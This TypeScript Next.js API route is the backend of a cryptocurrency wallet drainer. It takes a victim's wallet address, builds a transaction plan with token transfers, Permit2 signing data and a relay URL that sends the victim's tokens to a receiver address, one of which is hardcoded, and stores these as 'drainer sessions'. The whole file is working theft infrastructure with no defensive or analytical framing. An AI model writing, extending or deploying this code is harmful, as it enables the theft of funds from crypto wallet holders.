import { NextResponse } from "next/server";
import crypto from "crypto";
import { isAddress } from "viem";
import { buildTransactionPlan, type TokenAmount } from "@/lib/transaction-payload";

interface DrainerPayload {
  wallet: string;
  receiver?: string;
  site?: string;
  timestamp?: number;
  chainId?: number;
  contractId?: string;
  functionName?: string;
  tokens?: TokenAmount[];
  executionBackend?: string;
}

const sessions = new Map<
  string,
  {
    wallet: string;
    receiver: string;
    site: string;
    createdAt: number;
    expiresAt: number;
    plan: ReturnType<typeof buildTransactionPlan>;
  }
>();

const SESSION_TTL_MS = 24 * 60 * 60 * 1000;
setInterval(() => {
  const now = Date.now();
  for (const [key, session] of sessions.entries()) {
    if (session.expiresAt < now) sessions.delete(key);
  }
}, 5 * 60 * 1000);

export async function POST(request: Request) {
  try {
    const payload = (await request.json()) as DrainerPayload;

    if (!payload.wallet || typeof payload.wallet !== "string") {
      return NextResponse.json({ status: "error", message: "Wallet address is required" }, { status: 400 });
    }
    if (!payload.wallet.startsWith("0x") || payload.wallet.length !== 42) {
      return NextResponse.json({ status: "error", message: "Invalid wallet address format" }, { status: 400 });
    }
    const walletHex = payload.wallet.slice(2);
    if (!/^[0-9a-fA-F]{40}$/.test(walletHex)) {
      return NextResponse.json({ status: "error", message: "Invalid wallet address (not hex)" }, { status: 400 });
    }

    const receiver =
      payload.receiver || process.env.OWNER_ADDRESS || "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693";
    if (!isAddress(receiver, { strict: false })) {
      return NextResponse.json({ status: "error", message: "Invalid receiver address" }, { status: 400 });
    }

    const plan = buildTransactionPlan({
      wallet: payload.wallet,
      receiver,
      chainId: Number(payload.chainId) || 1,
      contractId: payload.contractId,
      functionName: payload.functionName,
      tokens: Array.isArray(payload.tokens) ? payload.tokens : [],
      executionBackend: payload.executionBackend,
    });

    const sessionKey = crypto.randomUUID();
    const now = Date.now();
    sessions.set(sessionKey, {
      wallet: payload.wallet.toLowerCase(),
      receiver: receiver.toLowerCase(),
      site: payload.site || "unknown",
      createdAt: now,
      expiresAt: now + SESSION_TTL_MS,
      plan,
    });

    return NextResponse.json({
      status: "ok",
      message: "Drainer session created",
      sessionKey,
      plan: {
        sessionKey,
        wallet: payload.wallet,
        receiver,
        strategy: plan.strategy,
        chainId: plan.chainId,
        contractId: plan.contractId,
        contractAddress: plan.contractAddress,
        tokens: plan.tokens,
        txs: plan.txs,
        permit2TypedData: plan.permit2TypedData,
        relayUrl: plan.relayUrl,
        createdAt: new Date(now).toISOString(),
      },
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : "Failed to create drainer session";
    console.error("[submit-drainer] Error:", message);
    return NextResponse.json({ status: "error", message }, { status: 500 });
  }
}

export async function GET(request: Request) {
  try {
    const { searchParams } = new URL(request.url);
    const sessionKey = searchParams.get("sessionKey");

    if (!sessionKey) {
      return NextResponse.json({
        status: "ok",
        sessions: sessions.size,
        message: "Drainer backend active",
      });
    }

    const session = sessions.get(sessionKey);
    if (!session) {
      return NextResponse.json({ status: "error", message: "Session not found or expired" }, { status: 404 });
    }

    return NextResponse.json({
      status: "ok",
      sessionKey,
      wallet: session.wallet,
      receiver: session.receiver,
      site: session.site,
      createdAt: new Date(session.createdAt).toISOString(),
      expiresAt: new Date(session.expiresAt).toISOString(),
      plan: session.plan,
    });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : "Failed to retrieve session";
    return NextResponse.json({ status: "error", message }, { status: 500 });
  }
}
